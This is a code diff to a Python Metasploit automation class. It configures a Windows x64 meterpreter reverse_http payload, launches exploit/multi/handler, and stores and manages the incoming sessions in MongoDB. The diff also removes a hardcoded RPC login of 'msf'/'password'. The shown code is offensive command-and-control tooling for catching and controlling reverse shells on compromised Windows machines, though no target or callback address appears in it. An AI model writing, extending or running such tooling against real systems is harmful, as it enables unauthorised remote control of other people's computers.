@@ -5,16 +5,23 @@ from pymetasploit3.msfrpc import MsfRpcError, MsfRpcClient
 from pymetasploit3.msfconsole import MsfRpcConsole
 from connectMsfRpcClient import connectMsfRpcClient
 from sessionMod import sessionMod
+from mongo_setup import global_init
+import data.data_services as svc
 import sys
 import time
 import random
 
 class msfAutomation:
-    choose_payload = ['windows/meterpreter/reverse_http', 'windows/meterpreter/reverse_https']
-    def __init__(self):
+    choose_payload = ['windows/x64/meterpreter/reverse_http']
+    def __init__(self, msfclient):
+        self.msfclient = msfclient
+        # starting mongo
+        global_init()
+        # clearing sessions for new sessions
+        svc.deleteSessions()
+
         print("[!]Starting Automation...")
         msfrpcdHandler()
-        self.msfclient = connectMsfRpcClient('msf', 'password', '55553', '127.0.0.1', 'False')
         if self.msfclient.connect() is False:
             sys.exit()
         print("[!]Running exploit: exploit/multi/handler")
@@ -33,5 +40,3 @@ class msfAutomation:
         print("[!]Executing exploit...")
         time.sleep(10)
         sessionMod(self.msfclient).activeSessionController()
-
-msfAutomation()
